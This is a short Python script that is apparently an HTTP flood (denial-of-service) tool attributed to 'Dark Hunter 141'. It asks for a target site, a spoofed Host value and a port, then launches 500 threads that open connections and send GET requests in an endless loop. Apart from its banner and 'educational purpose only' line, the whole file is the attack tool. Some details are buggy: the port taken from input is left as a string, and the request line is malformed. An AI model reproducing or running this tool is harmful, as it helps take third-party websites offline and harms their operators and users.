import socket
import threading
from time import sleep
import sys
 
 


def animate(text):
      for letter in text:
       print(letter, end="")
       sys.stdout.flush()
       sleep(0.0000000000000000000001)
       
banner = '''
\033[1;32;40mTeam        : Dark Hunter 141
Coded By    : Ashrafi Khandaker Abir(DarkXploit)
              Shariful Islam (DarkWolf)
Note : Use educational perpose only 
'''
print("\033[1;35;40m="*50)
animate(banner)
print("\033[1;35;40m="*50)
def target(url):
    ip = socket.gethostbyname(url) 
    return ip
url = input("\033[1;32;40mEnter site name without http:// or https://  example : target.com : ")
target = target(url)
print (f"\033[1;33;40mSite Name is   {url}:::IP Address is    {target}")
fake_ip = input("\033[1;32;40mEnter a fake ip or just click enter button for default :") or ('182.21.20.32')
print(f"\033[1;33;40mFake IP Is {fake_ip}")
port = input("\033[1;32;40mEnter port or just click enter for default : ")or  80
print(f"\033[1;33;40mPort number is {port}")
sleep(1)
       
attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()